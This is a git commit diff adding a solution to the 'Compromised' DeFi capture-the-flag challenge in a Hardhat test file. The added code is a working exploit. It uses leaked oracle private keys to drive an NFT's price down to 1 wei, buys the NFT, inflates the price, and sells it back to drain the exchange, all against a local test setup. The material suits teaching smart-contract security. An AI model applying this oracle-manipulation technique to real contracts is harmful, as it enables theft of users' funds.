1c177c7736125f4e33a36d566c2711ba146055df
0xDrogon <tiagofsdomingues@gmail.com>
2022-04-26 17:08:36 +0100

    Compromised Solved

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -1,3 +1,4 @@
+const { Web3Provider } = require('@ethersproject/providers');
 const { expect } = require('chai');
 const { ethers } = require('hardhat');
 
@@ -61,6 +62,33 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+
+        // private keys leaked (hex to utf8 to base64)
+        let privKey1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9"; // 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+        let privKey2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"; // 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+        
+        // import oracles
+        let oracle1 = new ethers.Wallet(privKey1, ethers.provider); 
+        let oracle2 = new ethers.Wallet(privKey2, ethers.provider); 
+
+        // set NFT price to 1 wei
+        await this.oracle.connect(oracle1).postPrice("DVNFT", 1);
+        await this.oracle.connect(oracle2).postPrice("DVNFT", 1);
+
+        // buy NFT for 1 wei
+        await this.exchange.connect(attacker).buyOne({value: 1});
+
+        // set NFT price to 9999 ether + 1 wei
+        await this.oracle.connect(oracle1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.add(1));
+        await this.oracle.connect(oracle2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.add(1));
+
+        // sell NFT for 9999 ether + 1 wei
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);
+        await this.exchange.connect(attacker).sellOne(0);
+
+        // set NFT price to initial price (INITIAL_NFT_PRICE)
+        await this.oracle.connect(oracle1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await this.oracle.connect(oracle2).postPrice("DVNFT", INITIAL_NFT_PRICE);
     });
 
     after(async function () {
